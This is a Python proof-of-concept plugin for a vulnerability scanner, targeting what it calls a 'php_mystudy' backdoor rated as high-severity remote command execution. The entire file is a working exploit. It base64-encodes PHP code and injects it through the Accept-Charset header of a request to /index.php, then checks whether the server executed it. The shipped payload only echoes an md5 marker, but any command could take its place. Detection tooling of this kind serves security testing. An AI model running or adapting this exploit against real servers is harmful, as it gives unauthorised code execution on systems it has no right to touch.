#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 20/4/10 17:23
# @Author  : Chaos
# @File    : php_mystudy_backdoor.py


import requests
import sys
import base64
import hashlib
import random

req_timeout = 3

def plugin_info():
	plugin_info = {
			"level":"High",
			"category":"远程命令执行",
			"extra":"php_mystudy后门",
			"info":""
			}
	return plugin_info

def poc(hostname, port, service):
	if service.lower().find('http') < 0:
		return False, False
	url = '%s://%s:%s' % (service, hostname, port)
	s= str(random.random())
	m = hashlib.md5()
	b = s.encode(encoding='utf-8')
	m.update(b)
	s_md5 = m.hexdigest()
	s = "echo(md5('{0}'));".format(s)
	poc = base64.b64encode(s.encode('utf-8'))
	targeturl2 = url.rstrip('/') + "/index.php"
	headers = {
			"Accept-Charset": poc,
			"Accept-Encoding": 'gzip,deflate'
		}
	try:
		c = requests.get(targeturl2,verify=False, headers=headers, allow_redirects=False,proxies={"http":"127.0.0.1:8080"})
		print(c.content)
		if s_md5 in c.text:
			return url, False
	except Exception:
		# raise e
		pass
	return False, False
